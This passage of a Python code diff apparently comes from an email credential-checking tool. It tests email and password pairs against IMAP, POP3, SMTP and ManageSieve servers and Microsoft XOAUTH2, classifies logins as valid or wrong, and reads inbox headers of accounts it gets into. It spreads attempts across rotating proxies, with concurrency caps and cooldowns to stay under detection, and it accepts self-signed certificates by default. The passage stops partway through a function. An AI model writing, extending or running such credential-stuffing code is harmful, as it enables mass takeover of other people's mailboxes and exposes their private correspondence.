+        d = email.split('@')[-1] if '@' in email else 'localhost'
+        fp = generate_candidate_hosts(d, [])
+        return _merge_domain_guesses({"imap": fp, "pop": fp, "pop3": fp}, d)
+# @@END 093 GET_SERVERS
+
+# @@BLOCK 094 USERNAME_CANDIDATES deps=-
+def username_candidates(email):
+    email = (email or "").strip()
+    if not email:
+        return [email]
+    out = [email]
+    if "@" in email:
+        local = email.split("@", 1)[0].strip()
+        if local and local.lower() != email.lower():
+            out.append(local)
+    return list(dict.fromkeys(out))
+# @@END 094 USERNAME_CANDIDATES
+
+# @@BLOCK 095 IMAP_ATTEMPTS deps=063,064
+def imap_once(email, password, server, proxy_str=None, insecure=None, port=993,
+              attempt_timeout=None):
+    if insecure is None:
+        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
+    to = attempt_timeout or CFG["TIMEOUT"]
+    mail = None
+    try:
+        mail = ProxyIMAP4SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
+        _imap_auth(mail, email, password)
+        st_typ, st_data = mail.select("INBOX", readonly=True)
+        if st_typ != 'OK':
+            raise RuntimeError(f"IMAP post-auth inbox select failed "
+                               f"(possible proxy spoofing): {st_typ} {st_data}")
+        try:
+            mail.noop()
+        except Exception:
+            pass
+    finally:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
+
+
+def imap_starttls_once(email, password, server, proxy_str=None, insecure=None, port=143,
+                       attempt_timeout=None):
+    if insecure is None:
+        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
+    to = attempt_timeout or CFG["TIMEOUT"]
+    mail = None
+    try:
+        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
+        mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
+        _imap_auth(mail, email, password)
+        st_typ, st_data = mail.select("INBOX", readonly=True)
+        if st_typ != 'OK':
+            raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {st_typ} {st_data}")
+        try:
+            mail.noop()
+        except Exception:
+            pass
+    finally:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
+
+
+def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
+    to = attempt_timeout or CFG["TIMEOUT"]
+    mail = None
+    try:
+        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
+        _imap_auth(mail, email, password)
+        st_typ, st_data = mail.select("INBOX", readonly=True)
+        if st_typ != 'OK':
+            raise RuntimeError(f"IMAP plain post-auth inbox select failed: {st_typ} {st_data}")
+        try:
+            mail.noop()
+        except Exception:
+            pass
+    finally:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
+# @@END 095 IMAP_ATTEMPTS
+
+# @@BLOCK 096 POP_ATTEMPTS deps=063
+def pop_once(email, password, server, proxy_str=None, insecure=None, port=995,
+             attempt_timeout=None):
+    if insecure is None:
+        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
+    to = attempt_timeout or CFG["TIMEOUT"]
+    mail = None
+    try:
+        mail = ProxyPOP3SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
+        if not pop3_ok(mail.getwelcome()):
+            raise RuntimeError("POP3 invalid welcome banner")
+        if not pop3_ok(mail.user(email.strip())):
+            raise RuntimeError("POP3 user rejected")
+        if not pop3_ok(mail.pass_(password.strip())):
+            raise RuntimeError("POP3 password rejected")
+        if not pop3_ok(mail.stat()):
+            raise RuntimeError("POP3 post-auth stat failed (possible proxy spoofing)")
+        try:
+            mail.noop()
+        except Exception:
+            pass
+    finally:
+        if mail:
+            try:
+                mail.quit()
+            except Exception:
+                pass
+
+
+def pop_starttls_once(email, password, server, proxy_str=None, insecure=None, port=110,
+                      attempt_timeout=None):
+    if insecure is None:
+        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
+    to = attempt_timeout or CFG["TIMEOUT"]
+    mail = None
+    try:
+        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
+        mail.stls(context=_tls_context(server, verify=not insecure))
+        if not pop3_ok(mail.user(email.strip())):
+            raise RuntimeError("POP3 STLS user rejected")
+        if not pop3_ok(mail.pass_(password.strip())):
+            raise RuntimeError("POP3 STLS password rejected")
+        if not pop3_ok(mail.stat()):
+            raise RuntimeError("POP3 STLS post-auth stat failed")
+        try:
+            mail.noop()
+        except Exception:
+            pass
+    finally:
+        if mail:
+            try:
+                mail.quit()
+            except Exception:
+                pass
+
+
+def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_timeout=None):
+    to = attempt_timeout or CFG["TIMEOUT"]
+    mail = None
+    try:
+        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
+        if not pop3_ok(mail.getwelcome()):
+            raise RuntimeError("POP3 plain invalid welcome banner")
+        if not pop3_ok(mail.user(email.strip())):
+            raise RuntimeError("POP3 plain user rejected")
+        if not pop3_ok(mail.pass_(password.strip())):
+            raise RuntimeError("POP3 plain password rejected")
+        if not pop3_ok(mail.stat()):
+            raise RuntimeError("POP3 plain post-auth stat failed")
+        try:
+            mail.noop()
+        except Exception:
+            pass
+    finally:
+        if mail:
+            try:
+                mail.quit()
+            except Exception:
+                pass
+# @@END 096 POP_ATTEMPTS
+
+# @@BLOCK 097 VERIFY_AND_CONNECT deps=005,022,061,063,064,093,094
+def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
+    """Used by the in-app Mailbox Reader."""
+    users = username_candidates(target_email)
+    _ins = bool(CFG.get("ALLOW_SELF_SIGNED", True))
+    for h in hosts:
+        if MS_OAUTH_OK and h.lower() in ms_oauth.MS_IMAP_HOSTS:
+            try:
+                mail, _exists, _claims = ms_oauth.imap_xoauth2_open(
+                    target_email, target_pass, h, ProxyIMAP4SSL,
+                    port=993, proxy_str=proxy_str,
+                    insecure=_ins, attempt_timeout=15)
+                return True, mail, h
+            except ms_oauth.MsTokenRejected as tr:
+                if tr.verdict in ("wrong_password", "need_app_password"):
+                    raise MsVerdict(tr.verdict,
+                                    f"Microsoft XOAUTH2 {tr.code} -> {tr.verdict}")
+            except Exception:
+                pass
+
+        for mode, port in (("ssl", 993), ("starttls", 143), ("plain", 143)):
+            for user in users:
+                mail = None
+                try:
+                    if mode == "ssl":
+                        mail = ProxyIMAP4SSL(h, port, timeout=10, proxy_str=proxy_str,
+                                             insecure=_ins)
+                    elif mode == "starttls":
+                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
+                        mail.starttls(ssl_context=_tls_context(h, verify=not _ins))
+                    else:
+                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
+                    _imap_auth(mail, user, target_pass)
+                    st_typ, _ = mail.select("INBOX", readonly=True)
+                    if st_typ == 'OK':
+                        return True, mail, h
+                    try:
+                        mail.logout()
+                    except Exception:
+                        pass
+                except Exception:
+                    if mail:
+                        try:
+                            mail.logout()
+                        except Exception:
+                            pass
+                    continue
+    return False, None, ""
+# @@END 097 VERIFY_AND_CONNECT
+
+# @@BLOCK 098 READ_MAILBOX deps=022,093,097
+def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
+    mail = None
+    try:
+        conf_hosts = get_servers(email).get("imap", []) or [server]
+        verified, mail, _ = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
+        if not verified or not mail:
+            return ["Error reading mailbox: True credential verification failed."]
+        mail.select("INBOX")
+        typ, data = mail.search(None, "ALL")
+        if typ != "OK":
+            return ["No messages or folder empty."]
+        ids = data[0].split()
+        latest_ids = ids[-limit:] if len(ids) > limit else ids
+        messages = []
+        for mid in reversed(latest_ids):
+            typ, msg_data = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
+            if typ == "OK":
+                for rp in msg_data:
+                    if isinstance(rp, tuple):
+                        messages.append(rp[1].decode("utf-8", errors="ignore"))
+        try:
+            mail.logout()
+        except Exception:
+            pass
+        return messages if messages else ["No recent messages found."]
+    except MsVerdict as mv:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
+        return [f"Error reading mailbox: Microsoft token verdict -> {mv.verdict} ({mv})"]
+    except Exception as e:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
+        return [f"Error reading mailbox: {str(e)}"]
+# @@END 098 READ_MAILBOX
+
+# @@BLOCK 099 CHECK_WRAPPER deps=009,023
+def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
+    """Thin FAST_MODE cooldown wrapper around _check_account_core().
+
+    Stamping in ONE place, for INCONCLUSIVE outcomes only, makes it predictable:
+    a domain is backed off when it told us NOTHING, and never when it gave a real
+    answer (VALID / WRONG / NEED_APP_PASSWORD / LOGIN_DROPPED / RBL).
+    """
+    if trace_logs is None:
+        trace_logs = []
+
+    if not CFG.get("FAST_MODE", True):
+        return _check_account_core(email, password, conf, domain, proxy_pool,
+                                   thread_state, trace_logs)
+
+    ts = failed_domain_cache.get(domain)
+    if ts and (time.time() - ts) < CFG.get("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT):
+        trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. "
+                          f"Skipping immediately.")
+        return None, SKIP, SKIP, None, trace_logs
+    if ts:
+        failed_domain_cache.pop(domain, None)
+
+    out = _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs)
+    try:
+        _status = out[1]
+    except Exception:
+        _status = None
+    if _status in (FAILED, PROXY_UNHEALTHY, RETRY, DNS_FAILED, UNKNOWN, SMTP_FAILED):
+        failed_domain_cache[domain] = time.time()
+        trace_logs.append(
+            f"Fast Mode: domain '{domain}' armed for cooldown "
+            f"({CFG.get('FAILURE_COOLDOWN', FAILURE_COOLDOWN_DEFAULT)}s) after an "
+            f"inconclusive result [{_status}].")
+    return out
+# @@END 099 CHECK_WRAPPER
+
+# @@BLOCK 100 CORE_SETUP deps=009,010,011,012,016,017,021,022,023,026,040,058,059,060,067,068,076
+def _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
+    if trace_logs is None:
+        trace_logs = []
+
+    t_start = time.time()
+    retryable = False
+    net_fail = False
+    dns_ok = True
+
+    best_verdict = {"status": None, "detail": "", "host": ""}
+    flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False,
+             "saw_login_drop": False}
+    force_direct = {"flag": False}
+    host_407 = {}
+    net_failed_hosts = set()
+    retries_by_host = {}
+    conn_rotated = {}
+    used_proxies = set()
+    retried_407_subusers = set()
+    acct_407_total = 0
+    MAX_ROTATIONS = max(0, int(CFG.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)))
+
+    try:
+        if conf.get("type") == "zero_access":
+            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
+            return None, NEED_APP_PASSWORD, "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs
+
+        proxy_mode = CFG.get("PROXY_MODE", "fallback")
+        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
+        try_starttls = bool(CFG.get("TRY_STARTTLS", True))
+        try_alt_user = bool(CFG.get("TRY_ALT_USERNAME", True))
+        max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
+        configured_to = max(4.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))
+        same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))
+
+        flags_p = protocol_flags()
+        allow_imap = flags_p["imap"]
+        allow_pop = flags_p["pop"]
+        allow_smtp = flags_p["smtp"]
+        allow_sieve = flags_p["sieve"]
+        if not (allow_imap or allow_pop or allow_smtp or allow_sieve):
+            allow_imap = True
+
+        users = username_candidates(email) if try_alt_user else [email]
+        primary_user = users[0]
+
+        def note_verdict(st_val, detail, host="", force=False):
+            """Record a verdict, keeping the strongest one.
+
+            force=True is for a DEFINITIVE answer that must not be suppressed by
+            an earlier, vaguer one (Microsoft XOAUTH2 AADSTS50126).
+            """
+            if st_val not in (VALID, WRONG, APP, RBL, LOGIN_DROPPED, UNKNOWN):
+                return
+            cur = best_verdict["status"]
+            if force or cur is None or ST_PRIORITY.get(st_val, 99) < ST_PRIORITY.get(cur, 99):
+                best_verdict["status"] = st_val
+                best_verdict["detail"] = detail
+                best_verdict["host"] = host or ""
+                trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")
+
+        px = None
+        if proxy_pool and proxy_mode != "off":
+            if proxy_mode == "sticky":
+                if not thread_state.get("sticky_proxy"):
+                    thread_state["sticky_proxy"] = sample_alive_proxy(domain=domain)
+                px = thread_state["sticky_proxy"]
+            else:
+                px = sample_alive_proxy(domain=domain)
+            if px:
+                used_proxies.add(px)
+
+        _all_imap = [h for h in (conf.get("imap") or []) if h]
+        _imap_cap = max(2, min(4, max_hosts))
+        imap_hosts = _dedupe_hosts_by_ip(_all_imap, cap=_imap_cap)
+        _all_pop = [h for h in (conf.get("pop") or conf.get("pop3") or []) if h]
+        _pop_only = [h for h in _all_pop if h not in imap_hosts]
+        pop_hosts = (_pop_only or _all_pop)[:1]
+        _smtp_hosts = _smtp_hosts_for(domain) if allow_smtp else []
+        if len(_all_imap) > len(imap_hosts):
+            trace_logs.append(
+                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
+                f"(cap {_imap_cap}, duplicate IPs collapsed).")
+        if allow_smtp and not _smtp_hosts:
+            trace_logs.append("SMTP is selected but no SMTP submission host was discovered "
+                              "for this domain.")
+
+        if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
+            imap_hosts = imap_hosts + [domain]
+            trace_logs.append(f"Fallback host '{domain}' force-included as a final rung "
+                              f"(apex resolves).")
+
+        if domain in imap_hosts:
+            imap_hosts = [h for h in imap_hosts if h != domain] + [domain]
+
+        if domain.endswith("windstream.net") or domain.endswith("kinetic.net"):
+            _drop = {domain, "secure.windstream.net", "webmail.windstream.net"}
+            _kept = [h for h in imap_hosts if h.lower() not in _drop]
+            if _kept and len(_kept) != len(imap_hosts):
+                trace_logs.append(
+                    f"Web-only hosts dropped from the IMAP ladder (never answer on 993/143): "
+                    f"{[h for h in imap_hosts if h.lower() in _drop]}")
+                imap_hosts = _kept
+
+        _web = [h for h in imap_hosts if h.lower() in WEB_ONLY_HOSTS]
+        if _web and len(_web) < len(imap_hosts):
+            imap_hosts = [h for h in imap_hosts if h.lower() not in WEB_ONLY_HOSTS] + _web
+
+        trace_logs.append(
+            f"IMAP ladder after web-only drop: {imap_hosts} "
+            f"(POP {pop_hosts} | SMTP {_smtp_hosts})")
+
+        _local_roots = tuple(_domain_roots(domain))
+
+        def _is_local_host(h):
+            hl = (h or "").lower().strip()
+            if not hl:
+                return False
+            for r in _local_roots:
+                if hl == r or hl.endswith("." + r):
+                    return True
+            return False
+
+        domain_local_hosts = {h for h in (imap_hosts + pop_hosts + _smtp_hosts)
+                              if _is_local_host(h)}
+
+        tried_hosts = set()
+        # Hosts that already answered WRONG / NEED_APP_PASSWORD.  A verdict from
+        # ONE host is PROVISIONAL until a second independent host agrees, a second
+        # RUNG of the same host agrees, or nothing is left to dial.
+        wrong_hosts = set()
+        wrong_rungs = set()          # FIX P0-1: (server, proto, port)
+        app_hosts = set()
+        app_rungs = set()
+        confirm_wrong = bool(CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True))
+
+        trace_logs.append(
+            f"Protocols selected -> {' + '.join(active_protocols())} "
+            f"(SMTP/ManageSieve are CONFIRM-ONLY: a failure never lowers a verdict).")
+        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts} | SMTP {_smtp_hosts}")
+        if proxy_pool and proxy_mode != "off":
+            trace_logs.append(f"Proxy pool: {len(proxy_pool)} node(s) alive, "
+                              f"{quarantine_size()} quarantined for 407.")
+        trace_logs.append(
+            f"Concurrency: host cap {CFG.get('HOST_CONCURRENCY')} · "
+            f"per-IP cap {CFG.get('PROXY_IP_CONCURRENCY')} · "
+            f"per-subuser cap {CFG.get('PROXY_SUBUSER_CONCURRENCY')} · "
+            f"proxy cap {CFG.get('PROXY_CONCURRENCY')} · "
+            f"same-host retries {same_host_retries} · max rotations {MAX_ROTATIONS} · "
+            f"rotation {'RANDOM' if CFG.get('RANDOM_ROTATION', True) else 'round-robin'}")
+        trace_logs.append(f"WRONG confirmation across hosts: "
+                          f"{'ON' if confirm_wrong else 'OFF (one-rung)'}")
+
+        resolvable = [h for h in (imap_hosts + pop_hosts + _smtp_hosts) if fast_fail_dns_check(h)]
+        dns_ok = bool(resolvable)
+        if dns_ok:
+            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/"
+                              f"{len(imap_hosts) + len(pop_hosts) + len(_smtp_hosts)} "
+                              f"hosts resolve locally")
+        else:
+            trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
+            if not proxy_pool or proxy_mode == "off":
+                return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
+
+        imap_set = set(imap_hosts)
+        pop_only = [h for h in pop_hosts if h not in imap_set]
+        pop_dup = [h for h in pop_hosts if h in imap_set]
+
+        primary_plan = []
+        if allow_imap and imap_hosts:
+            primary_plan.append((RUNG_IMAP, imap_hosts[0], 993, "ssl"))
+        if allow_pop:
+            for _ph in pop_only:
+                primary_plan.append((RUNG_POP, _ph, 995, "ssl"))
+        if allow_imap:
+            for _h in imap_hosts[1:]:
+                primary_plan.append((RUNG_IMAP, _h, 993, "ssl"))
+        if allow_smtp:
+            for _sh in _smtp_hosts:
+                for _sp, _sm in SMTP_RUNG_PORTS:
+                    primary_plan.append((RUNG_SMTP, _sh, _sp, _sm))
+        if allow_sieve and imap_hosts:
+            primary_plan.append((RUNG_SIEVE, imap_hosts[0], SIEVE_PORT, "starttls"))
+
+        fallback_plan = []
+        if allow_pop:
+            fallback_plan += [(RUNG_POP, h, 995, "ssl") for h in pop_dup]
+        if try_starttls and allow_imap:
+            fallback_plan += [(RUNG_IMAP, h, 143, "starttls") for h in imap_hosts]
+            fallback_plan += [(RUNG_IMAP, h, 143, "plain") for h in imap_hosts[:2]]
+        if try_starttls and allow_pop:
+            for h in pop_hosts:
+                fallback_plan += [(RUNG_POP, h, 110, "starttls")]
+                fallback_plan += [(RUNG_POP, h, 110, "plain")]
+
+        if not primary_plan:
+            trace_logs.append("No candidate hosts for this domain under the selected protocols.")
+            return None, FAILED, "no candidate hosts for the selected protocols", None, trace_logs
+
+        rung_cost = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX))
+        work_floor = (len(primary_plan) * rung_cost * WORK_FLOOR_FACTOR) + WORK_FLOOR_PAD
+        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)) * 0.95)
+        if work_floor > budget:
+            trace_logs.append(
+                f"Budget floored to fit the work: {work_floor:.0f}s "
+                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x {WORK_FLOOR_FACTOR} "
+                f"+ {WORK_FLOOR_PAD:.0f}s) instead of the {budget:.0f}s the Deadline "
+                f"slider allows.")
+            budget = work_floor
+
+        proxy_deadline = t_start + (budget * PROXY_TOTAL_FRAC)
+        proxy_primary_deadline = t_start + (budget * PROXY_PRIMARY_FRAC)
+        hard_deadline = t_start + budget
+        direct_primary_deadline = t_start + (budget * DIRECT_PRIMARY_FRAC)
+        trace_logs.append(
+            f"Account window {budget:.0f}s -> proxy "
+            f"{budget * PROXY_PRIMARY_FRAC:.0f}s-{budget * PROXY_TOTAL_FRAC:.0f}s / "
+            f"direct {budget * DIRECT_PRIMARY_FRAC:.0f}s-{budget:.0f}s "
+            f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")
+
+        def _is_timeout(err):
+            s = str(err).lower()
+            return "timed out" in s or "timeout" in s
+
+        def _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to):
+            if proto == RUNG_IMAP:
+                if tls_mode == "ssl":
+                    imap_once(user, password, server, px_used, insecure=prefer_insecure,
+                              port=port, attempt_timeout=attempt_to)
+                elif tls_mode == "starttls":
+                    imap_starttls_once(user, password, server, px_used,
+                                       insecure=prefer_insecure, port=port,
+                                       attempt_timeout=attempt_to)
+                else:
+                    imap_plain_once(user, password, server, px_used, port=port,
+                                    attempt_timeout=attempt_to)
+            elif proto == RUNG_POP:
+                if tls_mode == "ssl":
+                    pop_once(user, password, server, px_used, insecure=prefer_insecure,
+                             port=port, attempt_timeout=attempt_to)
+                elif tls_mode == "starttls":
+                    pop_starttls_once(user, password, server, px_used,
+                                      insecure=prefer_insecure, port=port,
+                                      attempt_timeout=attempt_to)
+                else:
+                    pop_plain_once(user, password, server, px_used, port=port,
+                                   attempt_timeout=attempt_to)
+            elif proto == RUNG_SMTP:
+                smtp_auth_once(user, password, server, px_used, insecure=prefer_insecure,
+                               port=port, attempt_timeout=attempt_to)
+            else:
+                sieve_auth_once(user, password, server, px_used, insecure=prefer_insecure,
+                                port=port, attempt_timeout=attempt_to)
+
+        def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
+            """Serialised per destination host, per proxy IP, per sub-user, globally."""
+            gate = _host_gate(server)
+            got_host = gate.acquire(timeout=max(2.0, attempt_to))
+            try:
+                if deadline_ts is not None:
+                    _rem = deadline_ts - time.time()
+                    attempt_to = max(2.5, min(attempt_to, _rem)) if _rem > 1.0 else 2.0
+                if int(port) in LEGACY_PORTS:
+                    attempt_to = min(attempt_to, LEGACY_RUNG_TIMEOUT)
+                if px_used:
+                    got_proxy = _proxy_gate().acquire(timeout=_gate_wait(attempt_to))
+                    try:
+                        _pxinfo = parse_proxy(px_used)
+                        ipg = _ip_gate(_pxinfo["host"] if _pxinfo else None)
+                        got_ip = ipg.acquire(timeout=_gate_wait(attempt_to))
+                        try:
+                            sg = _subuser_gate((_pxinfo.get("user") or "").lower() if _pxinfo else "")
+                            got_sub = sg.acquire(timeout=_gate_wait(attempt_to))
+                            try:
+                                _do_attempt_raw(proto, server, port, tls_mode, user,
+                                                px_used, attempt_to)
+                            finally:
+                                if got_sub:
+                                    sg.release()
+                        finally:
+                            if got_ip:
+                                ipg.release()
+                    finally:
+                        if got_proxy:
+                            _proxy_gate().release()
+                else:
+                    _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to)
+            finally:
+                if got_host:
+                    gate.release()
+
+        err_text = ""
+        attempt_to_ref = [configured_to]
+# @@END 100 CORE_SETUP
+
+# @@BLOCK 101 CORE_VERDICT_HELPERS deps=022,023,067,100
+        def try_ms_xoauth2(server, px_used, attempt_to, err_snapshot=""):
+            nonlocal err_text, acct_407_total
+            if not MS_OAUTH_OK:
+                return None
+            if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
+                return None
+            if not ms_oauth.should_try_ms_xoauth2(server, err_snapshot or err_text, domain):
+                return None
+            try:
+                exists, claims = ms_oauth.imap_xoauth2_once(
+                    email, password, server, ProxyIMAP4SSL, port=993,
+                    proxy_str=px_used, insecure=prefer_insecure,
+                    attempt_timeout=attempt_to)
+                who = claims.get("preferred_username") or email
+                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 VALID on {server}:993 "
+                                  f"(EXISTS={exists}, as={who}, exp={claims.get('exp')})")
+                return (server, VALID,
+                        f"{px_tag(px_used)} XOAUTH2 | Host: {server} | Port: 993 | "
+                        f"real account password (basic auth disabled)",
+                        px_used, trace_logs)
+            except ms_oauth.MsTokenTransport as te:
+                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 transport issue -> verdict "
+                                  f"unchanged ({str(te)[:90]})")
+                return None
+            except ProxyAuthError as pae:
+                err_text = str(pae)
+                flags["saw_407"] = True
+                record_proxy_attempt(px_used, success=False,
+                                     is_network_error=True, is_proxy_auth=True)
+                host_407[server] = host_407.get(server, 0) + 1
+                acct_407_total += 1
+                trace_logs.append(
+                    f"{px_tag(px_used)} -> PROXY 407 (XOAUTH2) {server}:993: "
+                    f"{err_text[:200]} [Classified: proxy_unhealthy]")
+                return None
+            except ms_oauth.MsTokenRejected as tr:
+                if tr.verdict == "wrong_password":
+                    # force=True: AADSTS50126 is definitive.  Without it the IMAP
+                    # rung's APP (priority 1) suppressed this WRONG (priority 2).
+                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password",
+                                 server, force=True)
+                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
+                                      f"[{tr.code}] -> wrong password (definitive)")
+                elif tr.verdict == "need_app_password":
+                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required",
+                                 server, force=True)
+                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
+                                      f"[{tr.code}] -> MFA, app password required")
+                else:
+                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
+                                      f"[{tr.code}] -> no verdict change")
+                return None
+            except Exception as xe:
+                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 failed: {str(xe)[:90]}")
+                return None
+
+        def _rotate_to_fresh(px_used, seen_px, why, keep_node=False):
+            """keep_node=True holds the node that just REACHED the mail server."""
+            if keep_node:
+                trace_logs.append(f"Keeping proxy ({why}) -> {px_tag(px_used)}")
+                return px_used, False
+            newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
+            if newpx and newpx not in seen_px:
+                seen_px.add(newpx)
+                trace_logs.append(f"Rotating proxy ({why}) -> {px_tag(newpx)}")
+                return newpx, True
+            return px_used, False
+
+        def _handle_app_or_wrong(st_val, proto, server, port, user, u_idx, px_used, seen_px,
+                                 had_net, saw_retry):
+            """Shared body for the APP / WRONG verdict handling.
+
+            Returns (result_tuple_or_None, had_net, saw_retry, advance).
+              * result is not None      -> RETURN it
+              * advance is True         -> keep going (PROVISIONAL)
+              * advance is "retry_user" -> retry this host as the LOCAL PART
+
+            FIX P0-1 / P0-4: this helper previously carried a SECOND, unreachable
+            copy of the WRONG block after the first `return`, and the confirmation
+            gate counted only LOCAL hosts - while the current host was already in
+            tried_hosts.  On any domain whose only local candidate was one
+            imap.<domain> box the gate therefore confirmed on the FIRST rung and
+            a valid combo was reported WRONG without POP3, the sibling hosts or
+            143/110 ever being dialled.
+            """
+            if st_val == APP:
+                xres = try_ms_xoauth2(server, px_used, attempt_to_ref[0], err_text)
+                if xres:
+                    return xres, had_net, saw_retry, False
+                if u_idx + 1 < len(users):
+                    flags["saw_server"] = True
+                    px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
+                                                    keep_node=True)
+                    trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> "
+                                      f"retrying same host as local-part '{users[u_idx + 1]}'")
+                    return None, had_net, saw_retry, "retry_user"
+                app_hosts.add(server)
+                app_rungs.add((server, proto, port))
+                _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
+                _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
+                _confirmed = (len(app_hosts) >= 2) or (len(app_rungs) >= 2) or (not _conf_pool)
+                if (not confirm_wrong) or _confirmed:
+                    # A definitive XOAUTH2 WRONG outranks a basic-auth "app
+                    # password" signal - return the stronger one.
+                    if best_verdict["status"] == WRONG:
+                        return (None, WRONG,
+                                best_verdict["detail"] + _wrong_detail_note(domain, password),
+                                px_used, trace_logs), had_net, saw_retry, False
+                    return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}",
+                            px_used, trace_logs), had_net, saw_retry, False
+                trace_logs.append(
+                    f"{px_tag(px_used)} APP on {server} -> PROVISIONAL "
+                    f"({len(app_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
+                    f"still untried, {len(app_rungs)} rung(s) dialled) -> continuing")
+                return None, had_net, saw_retry, True
+
+            # ---- WRONG (single copy - the duplicate after the first return is gone) ----
+            # The local-part retry runs FIRST: a legacy Zimbra / cPanel / Dovecot
+            # front answers AUTHENTICATIONFAILED for 'user@domain' and accepts
+            # 'user'.  It must also run BEFORE wrong_hosts.add(), because the host
+            # has not been authoritatively tested until every username candidate is
+            # exhausted - otherwise one host can satisfy the confirmation gate on a
+            # username it was always going to reject.
+            if u_idx + 1 < len(users):
+                flags["saw_server"] = True
+                px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
+                                                keep_node=True)
+                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same "
+                                  f"host as local-part '{users[u_idx + 1]}'")
+                return None, had_net, saw_retry, "retry_user"
+
+            wrong_hosts.add(server)
+            wrong_rungs.add((server, proto, port))
+            _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
+            _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
+            _confirmed = (len(wrong_hosts) >= 2) or (len(wrong_rungs) >= 2) or (not _conf_pool)
+
+            if (not confirm_wrong) or _confirmed:
+                return (None, WRONG,
+                        f"{px_tag(px_used)} {proto} {server} -> {st_val}"
+                        + _wrong_detail_note(domain, password),
+                        px_used, trace_logs), had_net, saw_retry, False
+
+            trace_logs.append(
+                f"{px_tag(px_used)} WRONG on {server} -> PROVISIONAL "
+                f"({len(wrong_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
+                f"still untried, {len(wrong_rungs)} rung(s) dialled) -> continuing the ladder")
+            return None, had_net, saw_retry, True
+# @@END 101 CORE_VERDICT_HELPERS
+
+# @@BLOCK 102 CORE_SWEEP deps=016,100,101
+        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
+            nonlocal err_text, acct_407_total
+            had_net = False
+            saw_retry = False
+            if not rungs:
+                return None, had_net, saw_retry
+
+            left = deadline_ts - time.time()
+            if left <= 1.5:
+                trace_logs.append(f"{label}: no window left ({left:.1f}s).")
+                return None, had_net, saw_retry
+
